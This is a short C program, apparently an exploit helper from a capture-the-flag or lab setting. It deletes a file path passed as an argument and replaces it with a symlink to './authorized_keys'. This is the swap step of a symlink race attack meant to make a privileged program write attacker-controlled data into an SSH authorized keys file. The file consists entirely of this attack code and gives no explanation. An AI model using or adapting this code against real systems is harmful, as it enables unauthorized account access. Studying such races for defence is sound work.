#include<unistd.h>

int main(int argc, char * argv[]) {
	unlink(argv[1]);
	symlink("./authorized_keys",argv[1]);
}
